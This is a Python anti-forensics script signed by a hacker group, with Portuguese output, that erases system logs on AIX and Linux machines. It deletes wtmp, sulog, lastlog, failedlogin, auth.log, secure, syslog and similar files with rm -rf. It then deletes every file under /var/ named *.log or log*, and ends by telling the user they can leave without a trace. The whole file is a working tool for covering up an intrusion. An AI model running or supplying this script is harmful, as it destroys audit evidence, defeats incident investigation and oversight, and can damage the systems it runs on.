#!/usr/bin/python

# Removedor logs - AIX (IBM)
# Written By Plastyne - Anarchy Ghost
# Greet'z all my Fr13n$
# Plastyne; N0V3; C0LD3R; CooldSec; K3N1; D4RKR0N
# plastynehacking@gmail.com
# [18/07/2024] 


import os
import subprocess
import sys

sys.stdout.reconfigure(encoding='utf-8')

def remove_log(file_path):
    if os.path.exists(file_path):
        subprocess.run(['rm', '-rf', file_path])
        print(f"{file_path} - [+] Removido")
    else:
        print(f"{file_path} - [-] Não pôde ser removido")

print("[*] ----------------------------------- [*]")
print("[*]     Removedor de Logs - AIX (IBM)   [*]")
print("[*]              18-07-24               [*]")
print("[*] ----------------------------------- [*]\n")

print("[!] Começando a remover logs...\n")

log_files = [
    "/var/adm/pacct",
    "/var/adm/wtmp",
    "/var/adm/dtmp",
    "/var/adm/qacct",
    "/var/adm/sulog",
    "/var/adm/ras/errlog",
    "/var/adm/ras/bootlog",
    "/var/adm/cron/log",
    "/etc/utmp",
    "/etc/security/lastlog",
    "/etc/security/failedlogin",
    "/usr/spool/mqueue/syslog",
    "/var/log/auth.log",
    "/var/log/secure",
    "/var/log/messages",
    "/var/log/syslog",
    "/var/log/btmp",
    "/var/log/daemon.log",
    "/var/log/kern.log",
    "/var/log/maillog",
    "/var/log/yum.log",
    "/var/log/faillog",
    "/var/log/apport.log",
    "/var/log/alternatives.log",
    "/var/log/bootstrap.log",
    "/var/log/dpkg.log"
]

for log_file in log_files:
    remove_log(log_file)

subprocess.run(['find', '/var/', '-name', '*.log', '-exec', 'rm', '-rf', '{}', ';'])
print("Arquivos *.log - [+] Removidos!")
subprocess.run(['find', '/var/', '-name', 'log*', '-exec', 'rm', '-rf', '{}', ';'])
print("Arquivos log* - [+] Removidos!\n")

print("LOGS REMOVIDOS!! Pode ir tranquilo :D\n")
